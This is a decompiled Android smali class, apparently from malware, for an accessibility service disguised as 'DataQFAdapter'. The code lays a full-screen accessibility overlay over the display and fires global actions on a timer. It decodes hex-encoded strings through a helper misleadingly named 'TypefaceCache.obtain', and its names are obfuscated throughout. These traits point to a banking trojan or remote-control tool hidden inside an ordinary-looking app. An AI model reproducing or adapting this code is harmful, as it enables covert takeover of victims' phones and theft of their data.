.class public final synthetic Lv/s/TgFV4UY0xAiKxQwpKNg;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

.field public final synthetic w9sT1Swbhx3hs:I


# direct methods
.method public synthetic constructor <init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V
    .locals 0

    .line 1
    iput p2, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 4
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 9

    .line 1
    iget v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    const/4 v1, 0x2

    .line 4
    packed-switch v0, :pswitch_data_0

    .line 5
    .line 6
    .line 7
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 8
    .line 9
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    nop

    .line 10
    .line 11
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->w9sT1Swbhx3hs:Ljava/lang/String;

    nop

    .line 12
    .line 13
    invoke-static {v0, v1}, Lv/s/vbdyByOHPJmeGXlq;->K7eEOBPYP9VIoHWTe(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V

    .line 14
    .line 15
    .line 16
    return-void

    .line 17
    :pswitch_0
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 18
    .line 19
    :try_start_0
    sget-boolean v1, Lv/s/vbdyByOHPJmeGXlq;->xfn2GJwmGqs7kWW:Z

    .line 20
    .line 21
    if-eqz v1, :cond_0

    .line 22
    .line 23
    goto :goto_2

    .line 24
    :cond_0
    const-string v1, "window"

    .line 25
    .line 26
    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 27
    .line 28
    .line 29
    move-result-object v1

    .line 30
    check-cast v1, Landroid/view/WindowManager;

    .line 31
    .line 32
    sget-object v2, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 33
    .line 34
    invoke-static {v0}, Lv/s/vbdyByOHPJmeGXlq;->w9sT1Swbhx3hs(Landroid/content/Context;)Lv/s/KtHgo1ZBbTF0NSPosJz;

    .line 35
    .line 36
    .line 37
    move-result-object v2

    .line 38
    sput-object v2, Lv/s/vbdyByOHPJmeGXlq;->tne6mXOUFKdd:Lv/s/KtHgo1ZBbTF0NSPosJz;

    .line 39
    .line 40
    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    .line 41
    .line 42
    const v7, 0x588

    .line 43
    .line 44
    const/16 v8, -0x3

    .line 45
    const/16 v4, -0x1

    .line 46
    const/16 v5, -0x1

    .line 47
    const/16 v6, 0x7f0

    .line 48
    .line 49
    invoke-direct/range {v3 .. v8}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 50
    .line 51
    .line 52
    const v2, 0x800033

    .line 53
    .line 54
    .line 55
    iput v2, v3, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 56
    .line 57
    sget-object v2, Lv/s/vbdyByOHPJmeGXlq;->tne6mXOUFKdd:Lv/s/KtHgo1ZBbTF0NSPosJz;

    nop

    nop

    .line 58
    .line 59
    invoke-interface {v1, v2, v3}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 60
    .line 61
    .line 62
    const/16 v1, 0x1

    .line 63
    sput-boolean v1, Lv/s/vbdyByOHPJmeGXlq;->xfn2GJwmGqs7kWW:Z

    nop

    .line 64
    .line 65
    const-string v2, "00020066004B00C700FC00B000D100AC00630079004D008200E200B300D300BE006300650053008800E700B1"

    .line 66
    .line 67
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 68
    .line 69
    .line 70
    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 71
    .line 72
    .line 73
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->Qrz92kRPw4GcghAc:Landroid/os/Handler;

    .line 74
    .line 75
    new-instance v2, Lv/s/TgFV4UY0xAiKxQwpKNg;

    nop

    nop

    .line 76
    .line 77
    const/16 v3, 0xf

    .line 78
    .line 79
    invoke-direct {v2, v0, v3}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 80
    .line 81
    .line 82
    const-wide/16 v3, 0x96

    nop

    .line 83
    .line 84
    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 85
    .line 86
    .line 87
    sget-object v2, Lv/s/vbdyByOHPJmeGXlq;->fivkjwgu2UdAtiY:Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 88
    .line 89
    if-eqz v2, :cond_1

    .line 90
    .line 91
    invoke-virtual {v1, v2}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 92
    .line 93
    .line 94
    goto/16 :goto_0

    .line 95
    :catch_0
    move-exception v0

    .line 96
    goto :goto_1

    nop

    .line 97
    :cond_1
    :goto_0
    new-instance v2, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 98
    .line 99
    const v3, 0x10

    .line 100
    .line 101
    invoke-direct {v2, v0, v3}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 102
    .line 103
    .line 104
    sput-object v2, Lv/s/vbdyByOHPJmeGXlq;->fivkjwgu2UdAtiY:Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 105
    .line 106
    const-wide/16 v3, 0x7d0

    .line 107
    .line 108
    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 109
    .line 110
    .line 111
    goto :goto_2

    .line 112
    :goto_1
    const-string v1, "0030007E0054009000D100AF00C2008B002C0075005000C700F500AD00C000A80031002C001B"

    .line 113
    .line 114
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 115
    .line 116
    .line 117
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 118
    .line 119
    .line 120
    :goto_2
    return-void

    .line 121
    :pswitch_1
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 122
    .line 123
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 124
    .line 125
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 126
    .line 127
    invoke-static {v0, v1}, Lv/s/vbdyByOHPJmeGXlq;->K7eEOBPYP9VIoHWTe(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V

    .line 128
    .line 129
    .line 130
    return-void

    .line 131
    :pswitch_2
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 132
    .line 133
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 134
    .line 135
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->xDyLpEZyrcKVe0:Ljava/lang/String;

    .line 136
    .line 137
    invoke-static {v0, v1}, Lv/s/vbdyByOHPJmeGXlq;->K7eEOBPYP9VIoHWTe(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V

    .line 138
    .line 139
    .line 140
    return-void

    .line 141
    :pswitch_3
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 142
    .line 143
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 144
    .line 145
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    .line 146
    .line 147
    invoke-static {v0, v1}, Lv/s/vbdyByOHPJmeGXlq;->K7eEOBPYP9VIoHWTe(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V

    .line 148
    .line 149
    .line 150
    return-void

    .line 151
    :pswitch_4
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 152
    .line 153
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 154
    .line 155
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->xDyLpEZyrcKVe0:Ljava/lang/String;

    .line 156
    .line 157
    invoke-static {v0, v1}, Lv/s/vbdyByOHPJmeGXlq;->K7eEOBPYP9VIoHWTe(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V

    .line 158
    .line 159
    .line 160
    return-void

    .line 161
    :pswitch_5
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 162
    .line 163
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    nop

    .line 164
    .line 165
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 166
    .line 167
    invoke-static {v0, v1}, Lv/s/vbdyByOHPJmeGXlq;->K7eEOBPYP9VIoHWTe(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V

    .line 168
    .line 169
    .line 170
    return-void

    .line 171
    :pswitch_6
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 172
    .line 173
    sget-object v2, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 174
    .line 175
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->gmNWMfvn6zlEj()V

    .line 176
    .line 177
    .line 178
    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 179
    .line 180
    .line 181
    return-void

    .line 182
    :pswitch_7
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 183
    .line 184
    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 185
    .line 186
    .line 187
    return-void

    .line 188
    :pswitch_8
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 189
    .line 190
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 191
    .line 192
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->ibVTtJUNfrGYbW:Ljava/lang/String;

    .line 193
    .line 194
    invoke-static {v0, v1}, Lv/s/vbdyByOHPJmeGXlq;->K7eEOBPYP9VIoHWTe(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V

    .line 195
    .line 196
    .line 197
    return-void

    .line 198
    :pswitch_9
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 199
    .line 200
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 201
    .line 202
    sget-object v1, Lv/s/vbdyByOHPJmeGXlq;->vekpFI4d1Nc4fakF:Ljava/lang/String;

    nop

    nop

    .line 203
    .line 204
    invoke-static {v0, v1}, Lv/s/vbdyByOHPJmeGXlq;->K7eEOBPYP9VIoHWTe(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V

    .line 205
    .line 206
    .line 207
    return-void

    .line 208
    :pswitch_a
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 209
    .line 210
    sget-object v1, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 211
    .line 212
    sget-boolean v1, Lv/s/VpKcDcuRNaQkRJ5;->xDyLpEZyrcKVe0:Z

    .line 213
    .line 214
    if-nez v1, :cond_2

    .line 215
    .line 216
    goto :goto_3

    .line 217
    :cond_2
    sget-object v1, Lv/s/h4nyZoRAsl44Uv;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    .line 218
    .line 219
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 220
    .line 221
    .line 222
    move-result-wide v1

    .line 223
    invoke-static {v0, v1, v2}, Lv/s/h4nyZoRAsl44Uv;->xDyLpEZyrcKVe0(Lapp/mobilex/plus/services/DataQFAdapter;J)V

    .line 224
    .line 225
    .line 226
    :goto_3
    return-void

    .line 227
    :pswitch_b
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 228
    .line 229
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->XiR1pIn5878vVWd(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 230
    .line 231
    .line 232
    return-void

    .line 233
    :pswitch_c
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 234
    .line 235
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->w9sT1Swbhx3hs(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 236
    .line 237
    .line 238
    return-void

    .line 239
    :pswitch_d
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 240
    .line 241
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->Qrz92kRPw4GcghAc(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 242
    .line 243
    .line 244
    return-void

    .line 245
    :pswitch_e
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 246
    .line 247
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->dDIMxZXP1V8HdM(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 248
    .line 249
    .line 250
    return-void

    .line 251
    :pswitch_f
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 252
    .line 253
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->xDyLpEZyrcKVe0(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 254
    .line 255
    .line 256
    return-void

    .line 257
    :pswitch_10
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    nop

    nop

    .line 258
    .line 259
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->J0zjQ7CAgohuxU20eCW6(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 260
    .line 261
    .line 262
    return-void

    .line 263
    :pswitch_11
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 264
    .line 265
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->l1V0lQr6TbwNKqHfXNbb(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 266
    .line 267
    .line 268
    return-void

    .line 269
    :pswitch_12
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 270
    .line 271
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->ibVTtJUNfrGYbW(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 272
    .line 273
    .line 274
    return-void

    .line 275
    :pswitch_13
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 276
    .line 277
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->vekpFI4d1Nc4fakF(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 278
    .line 279
    .line 280
    return-void

    .line 281
    :pswitch_14
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 282
    .line 283
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->gmNWMfvn6zlEj(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 284
    .line 285
    .line 286
    return-void

    .line 287
    :pswitch_15
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 288
    .line 289
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->wotphlvK9sPbXJ(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 290
    .line 291
    .line 292
    return-void

    nop

    .line 293
    :pswitch_16
    iget-object v0, p0, Lv/s/TgFV4UY0xAiKxQwpKNg;->vekpFI4d1Nc4fakF:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 294
    .line 295
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->D5P1xCAyuvgF(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 296
    .line 297
    .line 298
    return-void

    .line 299
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
